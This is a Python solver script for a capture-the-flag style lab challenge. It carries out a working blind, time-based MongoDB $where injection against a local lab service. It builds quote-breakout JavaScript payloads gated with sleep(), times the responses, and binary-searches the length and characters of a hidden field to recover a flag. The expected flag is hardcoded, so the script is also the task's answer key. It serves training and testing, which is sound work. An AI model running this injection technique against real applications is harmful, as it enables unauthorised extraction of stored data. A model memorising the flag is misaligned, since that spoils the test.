#!/usr/bin/env python3
"""solvers/p4_4.py, Task 4.4 "The Loophole Clause" canonical exploit.

The vetting console builds a MongoDB $where clause by raw Python string
concatenation:

    db.applicants.find({"$where": "this.codename == '" + codename + "'"})

and renders exactly one thing back, always: a fixed "logged for review"
message, whether codename matched, failed to match, or made the query
raise outright. Unlike p4_3's Records Room (a genuine match/no-match bit)
there is no boolean to read here: the response body is identical no
matter what happened server-side. $where reopens a STRING context (this
is JavaScript source text, not an operator dict), so the injection style
is the familiar quote-breakout from Phases 1-3, just landing in JS instead
of SQL, and the only channel the response never managed to close is how
long the query took: `sleep(ms)` inside the injected condition makes a
true branch measurably slower than a false one, even though both produce
the byte-identical page.

This is a real, live extraction against the running stack, every
character below is recovered by actually timing the oracle, not hardcoded
or simulated. The expected flag is only used for the final assertion.

Every payload stays gated behind `this.codename=='ghost' && (COND) &&
sleep(MS)`, so sleep() only ever fires for the one hidden document it's
meant to probe, not once per document $where happens to scan (the same
row-count-multiplication nuance p1_5.py's own header documents for SQL's
non-sargable OR, avoided here by construction instead of by threshold
tuning).
"""

from __future__ import annotations

import os
import sys
import time

import requests

BASE = os.environ.get("SEIYAKU_BASE", "http://localhost:8000")
EXPECTED_FLAG = "SEIYAKU{sleep_told_the_truth}"

MAX_LEN = 64
ASCII_LOW = 32
ASCII_HIGH = 126

# A local compose-network round trip is a few tens of ms; 400ms is
# comfortably above that floor and comfortably below any plausible false
# positive from jitter on a loaded sandbox, while keeping the ~29-char,
# ~7-bit-per-char bisection walk fast in practice (most probes during a
# binary search land on the FALSE branch, which costs no sleep at all).
SLEEP_MS = 400
SLEEP_SECONDS = SLEEP_MS / 1000.0
THRESHOLD_SECONDS = SLEEP_SECONDS * 0.6
REQUEST_TIMEOUT = SLEEP_SECONDS * 3 + 10

MARKER = "logged for review"


def _payload(cond: str) -> str:
    """Build the full injected `codename` value for a given JS boolean
    expression `cond`, gated to only ever touch the 'ghost' document."""
    return (
        "x' || (this.codename=='ghost' && (" + cond + ") && "
        f"sleep({SLEEP_MS})) || '"
    )


def oracle(cond: str) -> tuple[bool, float]:
    """Send one injected `codename` built from JS condition `cond`,
    return (is_slow, elapsed_seconds). is_slow=True means `cond`
    evaluated true (sleep() fired); False means false (or the query
    errored, both read identically, fast)."""
    payload = _payload(cond)
    start = time.monotonic()
    resp = requests.get(f"{BASE}/p4/loophole", params={"codename": payload}, timeout=REQUEST_TIMEOUT)
    elapsed = time.monotonic() - start
    resp.raise_for_status()
    if MARKER not in resp.text:
        raise RuntimeError(
            f"unexpected response shape for codename={payload!r}, missing "
            f"marker text, response may no longer look like a silent "
            f"logged-for-review page"
        )
    return elapsed >= THRESHOLD_SECONDS, elapsed


def confirm_injection_and_blind() -> None:
    """Step 0: confirm the injection point exists, the response is truly
    constant (identical regardless of truth), and only timing differs."""
    print("[p4_4] step 0, confirm injection point + blind (timing-only) oracle")

    slow, t_true = oracle("1==1")
    print(f"  cond='1==1'  -> {t_true:.3f}s ({'slow' if slow else 'fast'})")
    if not slow:
        raise RuntimeError(
            f"expected a slow (>= {THRESHOLD_SECONDS:.3f}s) response for an "
            f"always-true injected condition, got {t_true:.3f}s"
        )

    slow, t_false = oracle("1==2")
    print(f"  cond='1==2'  -> {t_false:.3f}s ({'slow' if slow else 'fast'})")
    if slow:
        raise RuntimeError(
            f"expected a fast (< {THRESHOLD_SECONDS:.3f}s) response for an "
            f"always-false injected condition, got {t_false:.3f}s"
        )

    # A plain, non-injected codename must read fast and show the same
    # generic marker, no distinguishable behavior for ordinary use.
    start = time.monotonic()
    resp = requests.get(f"{BASE}/p4/loophole", params={"codename": "rookie"}, timeout=REQUEST_TIMEOUT)
    t_plain = time.monotonic() - start
    print(f"  codename='rookie' (ordinary use) -> {t_plain:.3f}s")
    if t_plain >= THRESHOLD_SECONDS or MARKER not in resp.text:
        raise RuntimeError("ordinary, non-injected use did not read as fast/generic")

    print("  ok: oracle is genuinely blind in-band (true/false/plain render identically)")


def discover_length() -> int:
    """Binary-search the exact length of the ghost applicant's
    clearance_note via JS's .length."""
    lo, hi = 0, MAX_LEN
    while lo < hi:
        mid = (lo + hi + 1) // 2
        slow, _ = oracle(f"this.clearance_note.length>={mid}")
        if slow:
            lo = mid
        else:
            hi = mid - 1
    return lo


def discover_char(position: int) -> str:
    """Binary-search the char code of clearance_note[position] (0-indexed,
    JS .charCodeAt semantics) via timing."""
    lo, hi = ASCII_LOW, ASCII_HIGH
    while lo < hi:
        mid = (lo + hi + 1) // 2
        slow, _ = oracle(f"this.clearance_note.charCodeAt({position})>={mid}")
        if slow:
            lo = mid
        else:
            hi = mid - 1
    return chr(lo)


def main() -> int:
    print(f"[p4_4] target: {BASE}/p4/loophole")

    confirm_injection_and_blind()

    print("[p4_4] step 1, binary-search LENGTH(clearance_note) via .length")
    length = discover_length()
    print(f"  recovered length: {length}")
    if length <= 0 or length > MAX_LEN:
        print("[p4_4] FAIL: recovered an implausible length")
        return 1

    print(f"[p4_4] step 2, walk clearance_note char-by-char via .charCodeAt() bisection")
    chars: list[str] = []
    for pos in range(length):
        c = discover_char(pos)
        chars.append(c)
        print(f"  [{pos:02d}] -> {c!r}  (so far: {''.join(chars)!r})")

    value = "".join(chars)
    print(f"[p4_4] recovered value: {value}")

    if value != EXPECTED_FLAG:
        print(f"[p4_4] FAIL: recovered value does not match expected flag")
        print(f"  expected: {EXPECTED_FLAG!r}")
        print(f"  got:      {value!r}")
        return 1

    print(f"  ok: recovered flag matches: {value}")
    print("[p4_4] PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
